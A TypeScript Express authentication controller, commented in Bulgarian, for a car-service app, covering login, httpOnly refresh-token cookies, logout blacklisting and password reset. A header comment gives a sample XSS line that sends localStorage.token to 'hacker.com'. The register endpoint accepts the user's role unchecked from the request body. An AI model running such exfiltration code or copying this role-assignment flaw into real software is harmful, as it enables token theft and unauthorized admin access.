/**
 * ============================================
 * AUTHENTICATION CONTROLLER С HTTPONLY COOKIES
 * ============================================
 *
 * ЗАЩО HTTPONLY COOKIES ЗА REFRESH TOKENS?
 *
 * localStorage VS httpOnly Cookies - СИГУРНОСТТА:
 *
 * 1. localStorage (ПРЕДИШЕН ПОДХОД):
 *    ❌ Достъпен от JavaScript (window.localStorage.getItem())
 *    ❌ Уязвим към XSS attacks
 *    ❌ Ако някой инжектира злонамерен JS код, може да открадне токена
 *    ❌ Примерен attack: <script>fetch('hacker.com', {body: localStorage.token})</script>
 *
 * 2. httpOnly Cookies (НОВ ПОДХОД):
 *    ✅ НЕ Е достъпен от JavaScript (document.cookie не го показва)
 *    ✅ Само браузърът има достъп
 *    ✅ Автоматично се изпраща при всяка заявка към domain
 *    ✅ Дори при XSS, hacker НЕ МОЖЕ да прочете cookie-то
 *    ✅ secure flag - само през HTTPS
 *    ✅ sameSite - защита от CSRF
 *
 * КАК РАБОТИ СЕГА:
 *
 * LOGIN:
 * 1. User влиза с email/password
 * 2. Backend създава access token (15min) И refresh token (30 days)
 * 3. Access token се връща в JSON response
 * 4. Refresh token се връща като httpOnly cookie
 * 5. Frontend запазва само access token в localStorage
 * 6. Refresh token е скрит в cookie (JavaScript не може да го чете)
 *
 * REFRESH:
 * 1. Access token изтича след 15min
 * 2. Frontend вика /auth/refresh (БЕЗ да изпраща нищо!)
 * 3. Браузърът АВТОМАТИЧНО изпраща refresh token cookie
 * 4. Backend чете cookie-то с req.cookies.refreshToken
 * 5. Връща нов access token
 *
 * LOGOUT:
 * 1. Frontend вика /auth/logout
 * 2. Backend изтрива refresh token от DB
 * 3. Backend добавя access token в blacklist
 * 4. Backend изтрива refresh token cookie (res.clearCookie)
 * 5. User е изцяло logout-нат
 *
 * COOKIE OPTIONS ОБЯСНЕНИЕ:
 * - httpOnly: true    → JavaScript НЕ МОЖЕ да чете
 * - secure: true      → Само HTTPS (production)
 * - sameSite: strict  → Само same-site requests (защита от CSRF)
 * - maxAge: 30 days   → Автоматично изтриване след 30 дни
 */

import { Request, Response } from 'express';
import crypto from 'crypto';
import prisma from '../config/database';
import { hashPassword, comparePassword } from '../utils/hashPassword';
import { generateToken } from '../utils/generateToken';
import { validateEmailDomain } from '../utils/emailDnsValidation';
import logger from '../services/logger.service';
// Импортираме token utility функциите
import {
  createRefreshToken,
  validateRefreshToken,
  revokeRefreshToken,
  revokeAllUserRefreshTokens,
  blacklistToken,
} from '../utils/tokenUtils';

// ============================================
// REGISTER (ADMIN и CLIENT) – БЕЗ email verification
// ============================================
export const register = async (req: Request, res: Response): Promise<void> => {
  try {
    const { email, password, role } = req.body;

    const existingUser = await prisma.user.findUnique({ where: { email } });
    if (existingUser) {
      res.status(400).json({ message: 'User already exists' });
      return;
    }

    // Check if email domain exists
    const isDomainValid = await validateEmailDomain(email);
    if (!isDomainValid) {
      res.status(400).json({
        message: 'Email domain does not exist or cannot receive emails',
      });
      return;
    }

    const hashedPassword = await hashPassword(password);

    const user = await prisma.user.create({
      data: {
        email,
        password: hashedPassword,
        role,
      },
    });

    const token = generateToken({
      userId: user.id,
      email: user.email,
      role: user.role,
    });

    res.status(201).json({
      message: 'User registered successfully',
      token,
      user: {
        id: user.id,
        email: user.email,
        role: user.role,
      },
    });
  } catch (error) {
    logger.error('Auth error:', error);
    res.status(500).json({ message: 'Server error' });
  }
};

// ============================================
// LOGIN (with rememberMe)
// ============================================
/**
 * КАК РАБОТИ НОВИЯТ LOGIN FLOW С REFRESH TOKENS:
 *
 * Преди имахме:
 * - Само access token (JWT) с дълъг expiration
 * - При logout не можехме да invalidate-нем токена
 * - Ако токен бъде откраднат, няма начин да го спрем
 *
 * Сега имаме TWO-TOKEN SYSTEM:
 *
 * 1. ACCESS TOKEN (JWT):
 *    - Кратък живот (15 минути)
 *    - Съдържа user данни (userId, role, etc.)
 *    - Изпраща се при всяка API заявка
 *    - НЕ СЕ СЪХРАНЯВА В DB (stateless)
 *
 * 2. REFRESH TOKEN:
 *    - Дълъг живот (30 дни)
 *    - Random string (не JWT)
 *    - СЪХРАНЯВА СЕ В DB
 *    - Използва се само за да обнови access token
 *    - Може да бъде revoke-нат (изтрит от DB)
 *
 * FLOW:
 * 1. User влиза с email/password
 * 2. Създаваме access token (15min) И refresh token (30 days)
 * 3. Връщаме и двата токена
 * 4. Frontend запазва access token в localStorage
 * 5. Frontend запазва refresh token в httpOnly cookie (по-сигурно)
 * 6. След 15 минути access token изтича
 * 7. Frontend вика /auth/refresh с refresh token
 * 8. Backend проверява refresh token в DB
 * 9. Ако е валиден - издава НОВ access token
 * 10. Repeat steps 6-9...
 *
 * ПРЕДИМСТВА:
 * - Ако access token бъде откраднат, той изтича след 15 min
 * - При logout можем да изтрием refresh token от DB
 * - При смяна на парола изтриваме ВСИЧКИ refresh tokens
 * - По-добра сигурност без да жертваме UX
 */
export const login = async (req: Request, res: Response): Promise<void> => {
  try {
    const { email, password, rememberMe } = req.body;

    // 1. Намираме user-а
    const user = await prisma.user.findUnique({ where: { email } });
    if (!user) {
      res.status(401).json({ message: 'Invalid credentials' });
      return;
    }

    // 2. Проверяваме паролата
    const isPasswordValid = await comparePassword(password, user.password);
    if (!isPasswordValid) {
      res.status(401).json({ message: 'Invalid credentials' });
      return;
    }

    // 3. Вземаме serviceCompanyId ако е нужно
    let serviceCompanyId: string | undefined;

    if (user.role === 'ADMIN') {
      const serviceCompany = await prisma.serviceCompany.findUnique({
        where: { userId: user.id },
      });
      serviceCompanyId = serviceCompany?.id;
    } else if (user.role === 'MECHANIC') {
      const worker = await prisma.worker.findUnique({
        where: { userId: user.id },
      });
      serviceCompanyId = worker?.serviceCompanyId;
    }

    // 4. Създаваме ACCESS TOKEN (кратък живот - 15 минути)
    // Това е JWT който frontend изпраща при всяка заявка
    const accessToken = generateToken(
      {
        userId: user.id,
        email: user.email,
        role: user.role,
        serviceCompanyId,
      },
      '15m' // 15 минути!
    );

    // 5. Създаваме REFRESH TOKEN (дълъг живот - 30 дни)
    // Този токен се запазва в DB и се използва за обновяване
    const refreshToken = await createRefreshToken(user.id);

    // 6. 🆕 Изпращаме refresh token като httpOnly cookie
    // httpOnly означава че JavaScript НЕ МОЖЕ да чете cookie-то
    // Това защитава от XSS attacks - дори да има XSS, hacker не може да открадне refresh token
    res.cookie('refreshToken', refreshToken.token, {
      httpOnly: true, // JavaScript НЕ МОЖЕ да чете това cookie
      secure: process.env.NODE_ENV === 'production', // Само HTTPS в production
      sameSite: 'strict', // Защита от CSRF attacks
      maxAge: 30 * 24 * 60 * 60 * 1000, // 30 дни в milliseconds
    });

    // 7. Връщаме response
    res.status(200).json({
      message: 'Login successful',
      // Access token - за API заявки (кратък живот)
      accessToken,
      // Кога изтича access token
      accessTokenExpiresIn: '15m',
      // Refresh token вече НЕ го връщаме в JSON - той е в cookie!
      // refreshToken: refreshToken.token, // ❌ Махнахме това
      user: {
        id: user.id,
        email: user.email,
        role: user.role,
        serviceCompanyId,
      },
    });
  } catch (error) {
    logger.error('Auth error:', error);
    res.status(500).json({ message: 'Server error' });
  }
};

// ============================================
// LOGOUT
// ============================================
/**
 * КАК РАБОТИ LOGOUT С BLACKLIST SYSTEM:
 *
 * Проблемът с JWT tokens:
 * - JWT токените са stateless (не се съхраняват в DB)
 * - След като бъдат издадени, сървърът ги приема докато не изтекат
 * - Не можем просто да "изтрием" JWT токен
 *
 * Решението - Token Blacklist:
 * - При logout добавяме текущия access token в blacklist таблица
 * - Също изтриваме refresh token от DB
 * - При всяка заявка auth middleware проверява дали токенът е blacklisted
 * - Ако е blacklisted - отказваме достъп
 *
 * FLOW:
 * 1. User вика /logout и изпраща access token в Authorization header
 * 2. Изтриваме refresh token от DB (ако има)
 * 3. Добавяме access token в blacklist с expiration date
 * 4. След expiration date можем да изтрием от blacklist (cleanup)
 * 5. От този момент токенът вече не работи
 *
 * ЗАЩО РАБОТИ:
 * - Refresh token вече не съществува → не може да обнови access token
 * - Access token е в blacklist → не може да се използва за API заявки
 * - След 15 минути access token изтича естествено
 * - Cleanup job изтрива старите blacklisted tokens
 */
interface AuthRequest extends Request {
  user?: {
    userId: string;
    email: string;
    role: string;
  };
}

export const logout = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    // 1. Вземаме userId от authenticated request
    const userId = req.user?.userId;
    if (!userId) {
      res.status(401).json({ message: 'Unauthorized' });
      return;
    }

    // 2. Вземаме access token от Authorization header
    // Format: "Bearer <token>"
    const authHeader = req.headers.authorization;
    const accessToken = authHeader?.split(' ')[1]; // Вземаме само токена след "Bearer "

    // 3. 🆕 Вземаме refresh token от httpOnly cookie
    // Сега refresh token идва от cookie, не от request body
    const refreshToken = req.cookies.refreshToken;

    // 4. Изтриваме refresh token от DB (ако е подаден)
    // Това прави невъзможно обновяването на access token
    if (refreshToken) {
      await revokeRefreshToken(refreshToken);
    }

    // 5. Добавяме access token в blacklist
    // Това прави невъзможно използването му за API заявки
    if (accessToken) {
      await blacklistToken(accessToken, 'logout');
    }

    // 6. 🆕 Изтриваме refresh token cookie
    // Това изтрива cookie-то от browser-а
    res.clearCookie('refreshToken', {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
    });

    // 7. Успех!
    res.status(200).json({
      message: 'Logged out successfully',
    });
  } catch (error) {
    logger.error('Logout error:', error);
    res.status(500).json({ message: 'Server error' });
  }
};

// ============================================
// REFRESH TOKEN
// ============================================
/**
 * КАК РАБОТИ REFRESH TOKEN ENDPOINT:
 *
 * Защо е нужен?
 * - Access token изтича след 15 минути
 * - Не искаме user-ът да трябва да влиза отново всеки път
 * - Refresh token живее 30 дни и може да създаде нов access token
 *
 * FLOW:
 * 1. Frontend вика API заявка
 * 2. Получава 401 Unauthorized (защото access token е изтекъл)
 * 3. Автоматично вика /auth/refresh с refresh token
 * 4. Backend проверява refresh token в DB
 * 5. Ако е валиден - издава НОВ access token
 * 6. Frontend запазва новия access token
 * 7. Frontend повтаря оригиналната заявка с новия токен
 * 8. Success!
 *
 * СИГУРНОСТ:
 * - Refresh token се съхранява само в DB (може да бъде revoke-нат)
 * - Проверяваме дали не е изтекъл
 * - Проверяваме дали user-ът е активен
 * - При logout изтриваме refresh token
 * - При смяна на парола изтриваме ВСИЧКИ refresh tokens
 *
 * REFRESH TOKEN ROTATION (optional advanced feature):
 * - Можем да създаваме НОВ refresh token при всяка употреба
 * - Така ако стар refresh token бъде откраднат, ще видим че се използва 2 пъти
 * - За простота засега не го правим, но е добра идея за production
 */
export const refreshToken = async (
  req: Request,
  res: Response
): Promise<void> => {
  try {
    // 1. 🆕 Вземаме refresh token от httpOnly cookie
    // Сега не идва от body, а от cookie за по-добра сигурност
    const token = req.cookies.refreshToken;

    if (!token) {
      res.status(400).json({ message: 'Refresh token is required' });
      return;
    }

    // 2. Валидираме refresh token
    // Проверява се:
    // - Съществува ли в DB?
    // - Не е ли изтекъл?
    // - User-ът активен ли е?
    const refreshTokenData = await validateRefreshToken(token);

    if (!refreshTokenData) {
      res.status(401).json({ message: 'Invalid or expired refresh token' });
      return;
    }

    // 3. Вземаме user данни
    const user = refreshTokenData.user;

    // 4. Вземаме serviceCompanyId ако е нужно
    let serviceCompanyId: string | undefined;

    if (user.role === 'ADMIN') {
      const serviceCompany = await prisma.serviceCompany.findUnique({
        where: { userId: user.id },
      });
      serviceCompanyId = serviceCompany?.id;
    } else if (user.role === 'MECHANIC') {
      const worker = await prisma.worker.findUnique({
        where: { userId: user.id },
      });
      serviceCompanyId = worker?.serviceCompanyId;
    }

    // 5. Създаваме НОВ access token (fresh 15 minutes)
    const newAccessToken = generateToken(
      {
        userId: user.id,
        email: user.email,
        role: user.role,
        serviceCompanyId,
      },
      '15m'
    );

    // 6. Връщаме новия access token
    // Refresh token остава същият (single-use rotation е optional)
    res.status(200).json({
      message: 'Token refreshed successfully',
      accessToken: newAccessToken,
      accessTokenExpiresIn: '15m',
    });
  } catch (error) {
    logger.error('Refresh token error:', error);
    res.status(500).json({ message: 'Server error' });
  }
};

// ============================================
// REGISTER MECHANIC
// ============================================
export const registerMechanic = async (
  req: Request,
  res: Response
): Promise<void> => {
  try {
    const {
      email,
      password,
      firstName,
      lastName,
      phone,
      specialization,
      skills,
      uniqueCode,
    } = req.body;

    const existingUser = await prisma.user.findUnique({ where: { email } });
    if (existingUser) {
      res.status(400).json({ message: 'User with this email already exists' });
      return;
    }

    const isDomainValid = await validateEmailDomain(email);
    if (!isDomainValid) {
      res.status(400).json({
        message: 'Email domain does not exist or cannot receive emails',
      });
      return;
    }

    const serviceCompany = await prisma.serviceCompany.findUnique({
      where: { uniqueCode },
    });

    if (!serviceCompany) {
      res.status(404).json({ message: 'Invalid service company code' });
      return;
    }

    const hashedPassword = await hashPassword(password);

    // Use transaction to create user and pending request together
    const user = await prisma.$transaction(async (tx) => {
      const newUser = await tx.user.create({
        data: {
          email,
          password: hashedPassword,
          role: 'MECHANIC',
        },
      });

      await tx.pendingRequest.create({
        data: {
          email,
          firstName,
          lastName,
          phone,
          specialization,
          status: 'PENDING',
          serviceCompanyId: serviceCompany.id,
        },
      });

      return newUser;
    });

    res.status(201).json({
      message: 'Mechanic registration submitted. Waiting for admin approval.',
      email: user.email,
    });
  } catch (error) {
    logger.error('Auth error:', error);
    res.status(500).json({ message: 'Server error' });
  }
};

// ============================================
// ADD SERVICE COMPANY TO CLIENT
// ============================================
export const addServiceCompanyToClient = async (
  req: Request,
  res: Response
): Promise<void> => {
  try {
    const { uniqueCode, phone, firstName, lastName } = req.body;
    const userId = (req as any).user.userId;

    // Валидация на телефонен номер
    if (!phone || phone.trim().length === 0) {
      res.status(400).json({ message: 'Phone number is required' });
      return;
    }

    const serviceCompany = await prisma.serviceCompany.findUnique({
      where: { uniqueCode },
    });

    if (!serviceCompany) {
      res.status(404).json({ message: 'Invalid service company code' });
      return;
    }

    const user = await prisma.user.findUnique({ where: { id: userId } });
    if (!user || user.role !== 'CLIENT') {
      res.status(403).json({ message: 'Only clients can use this endpoint' });
      return;
    }

    const existingClient = await prisma.client.findFirst({
      where: { userId, serviceCompanyId: serviceCompany.id },
    });

    if (existingClient) {
      res.status(400).json({
        message: 'You are already a client of this service company',
      });
      return;
    }

    const client = await prisma.client.create({
      data: {
        firstName: firstName || '',
        lastName: lastName || '',
        phone: phone.trim(),
        email: user.email,
        userId,
        serviceCompanyId: serviceCompany.id,
      },
    });

    res.status(201).json({
      message: 'Successfully added to service company',
      client: {
        id: client.id,
        serviceCompanyName: serviceCompany.name,
      },
    });
  } catch (error) {
    logger.error('Auth error:', error);
    res.status(500).json({ message: 'Server error' });
  }
};

// ============================================
// FORGOT PASSWORD
// ============================================
export const forgotPassword = async (
  req: Request,
  res: Response
): Promise<void> => {
  try {
    const { email } = req.body;

    const user = await prisma.user.findUnique({ where: { email } });
    if (!user) {
      res.status(200).json({
        message: 'If email exists, reset code was sent',
      });
      return;
    }

    const resetCode = crypto.randomInt(100000, 999999).toString();
    const expiresAt = new Date(Date.now() + 15 * 60 * 1000);

    // Hash the code before storing it
    const hashedCode = await hashPassword(resetCode);

    await prisma.passwordReset.create({
      data: {
        userId: user.id,
        token: hashedCode,
        expiresAt,
      },
    });

    const emailService = await import('../services/email.service');
    await emailService.sendEmail(
      email,
      'Код за възстановяване на парола',
      `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #f97316;">Възстановяване на парола</h2>
          <p>Здравейте,</p>
          <p>Вашият код за възстановяване на парола е:</p>
          <h1 style="color: #f97316; text-align: center; font-size: 48px; letter-spacing: 5px;">${resetCode}</h1>
          <p>Кодът е валиден за 15 минути.</p>
          <p>Ако не сте поискали смяна на парола, игнорирайте този имейл.</p>
          <br>
          <p>С уважение,<br>Екипът на AutoManager</p>
        </div>
      `
    );

    res.status(200).json({ message: 'Reset code sent to email' });
  } catch (error) {
    logger.error('Auth error:', error);
    res.status(500).json({ message: 'Server error' });
  }
};

// ============================================
// RESET PASSWORD
// ============================================
export const resetPassword = async (
  req: Request,
  res: Response
): Promise<void> => {
  try {
    const { email, code, newPassword } = req.body;

    const user = await prisma.user.findUnique({ where: { email } });
    if (!user) {
      res.status(400).json({ message: 'Invalid email or code' });
      return;
    }

    // Find all valid password reset entries for this user
    const passwordResets = await prisma.passwordReset.findMany({
      where: {
        userId: user.id,
        expiresAt: { gte: new Date() },
      },
      orderBy: { createdAt: 'desc' },
    });

    // Check if any of the hashed tokens match
    let validPasswordReset = null;
    for (const reset of passwordResets) {
      const isCodeValid = await comparePassword(code, reset.token);
      if (isCodeValid) {
        validPasswordReset = reset;
        break;
      }
    }

    if (!validPasswordReset) {
      res.status(400).json({ message: 'Invalid or expired code' });
      return;
    }

    const hashedPassword = await hashPassword(newPassword);

    // ВАЖНО: При смяна на парола трябва да:
    // 1. Обновим паролата
    // 2. Invalidate-нем ВСИЧКИ активни сесии (refresh tokens)
    // Това е сигурностна мярка - ако някой е откраднал паролата,
    // след смяната й всички негови сесии ще спрат да работят
    await prisma.user.update({
      where: { id: user.id },
      data: { password: hashedPassword },
    });

    // Изтриваме използвания reset токен
    await prisma.passwordReset.delete({
      where: { id: validPasswordReset.id },
    });

    // Изтриваме ВСИЧКИ refresh tokens на user-а
    // Това логва out user-а от ВСИЧКИ devices
    await revokeAllUserRefreshTokens(user.id);

    res.status(200).json({
      message: 'Password reset successfully. Please login again.',
    });
  } catch (error) {
    logger.error('Auth error:', error);
    res.status(500).json({ message: 'Server error' });
  }
};

// ============================================
// RESEND PASSWORD RESET CODE
// ============================================
export const resendPasswordResetCode = async (
  req: Request,
  res: Response
): Promise<void> => {
  try {
    const { email } = req.body;

    const user = await prisma.user.findUnique({ where: { email } });
    if (!user) {
      res.status(200).json({
        message: 'If email exists, reset code was sent',
      });
      return;
    }

    const resetCode = crypto.randomInt(100000, 999999).toString();
    const expiresAt = new Date(Date.now() + 15 * 60 * 1000);

    // Hash the code before storing it
    const hashedCode = await hashPassword(resetCode);

    await prisma.passwordReset.create({
      data: {
        userId: user.id,
        token: hashedCode,
        expiresAt,
      },
    });

    const emailService = await import('../services/email.service');
    await emailService.sendEmail(
      email,
      'Нов код за възстановяване на парола',
      `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #f97316;">Възстановяване на парола</h2>
          <p>Здравейте,</p>
          <p>Вашият нов код за възстановяване на парола е:</p>
          <h1 style="color: #f97316; text-align: center; font-size: 48px; letter-spacing: 5px;">${resetCode}</h1>
          <p>Кодът е валиден за 15 минути.</p>
          <p>Ако не сте поискали нов код, игнорирайте този имейл.</p>
          <br>
          <p>С уважение,<br>Екипът на AutoManager</p>
        </div>
      `
    );

    res.status(200).json({ message: 'New reset code sent to email' });
  } catch (error) {
    logger.error('Auth error:', error);
    res.status(500).json({ message: 'Server error' });
  }
};

// ============================================
// REGISTER ADMIN WITH SERVICE COMPANY
// ============================================
export const registerAdminWithCompany = async (
  req: Request,
  res: Response
): Promise<void> => {
  try {
    const {
      email,
      password,
      companyName,
      companyAddress,
      companyPhone,
      companyEmail,
      bulstat,
      vatNumber,
      description,
    } = req.body;

    const existingUser = await prisma.user.findUnique({ where: { email } });
    if (existingUser) {
      res.status(400).json({ message: 'User already exists' });
      return;
    }

    const isDomainValid = await validateEmailDomain(email);
    if (!isDomainValid) {
      res.status(400).json({
        message: 'Email domain does not exist or cannot receive emails',
      });
      return;
    }

    const isCompanyEmailValid = await validateEmailDomain(companyEmail);
    if (!isCompanyEmailValid) {
      res.status(400).json({
        message: 'Company email domain does not exist or cannot receive emails',
      });
      return;
    }

    const hashedPassword = await hashPassword(password);
    const { generateUniqueCode } = await import('../utils/generateUniqueCode');
    const uniqueCode = generateUniqueCode();

    // Use transaction to ensure both user and company are created together
    const result = await prisma.$transaction(async (tx) => {
      const user = await tx.user.create({
        data: {
          email,
          password: hashedPassword,
          role: 'ADMIN',
        },
      });

      const serviceCompany = await tx.serviceCompany.create({
        data: {
          name: companyName,
          address: companyAddress,
          phone: companyPhone,
          email: companyEmail,
          uniqueCode,
          bulstat,
          vatNumber,
          description,
          userId: user.id,
        },
      });

      return { user, serviceCompany };
    });

    const { user, serviceCompany } = result;

    // Създаваме access token (15 minutes)
    const accessToken = generateToken(
      {
        userId: user.id,
        email: user.email,
        role: user.role,
        serviceCompanyId: serviceCompany.id,
      },
      '15m'
    );

    // Създаваме refresh token (30 days)
    const refreshToken = await createRefreshToken(user.id);

    // Изпращаме refresh token като httpOnly cookie
    res.cookie('refreshToken', refreshToken.token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
    });

    res.status(201).json({
      message: 'Admin and service company created successfully',
      accessToken, // 🆕 връщаме accessToken вместо token
      user: {
        id: user.id,
        email: user.email,
        role: user.role,
        serviceCompanyId: serviceCompany.id,
      },
      serviceCompany: {
        id: serviceCompany.id,
        name: serviceCompany.name,
        uniqueCode: serviceCompany.uniqueCode,
      },
    });
  } catch (error) {
    logger.error('Auth error:', error);
    res.status(500).json({ message: 'Server error' });
  }
};

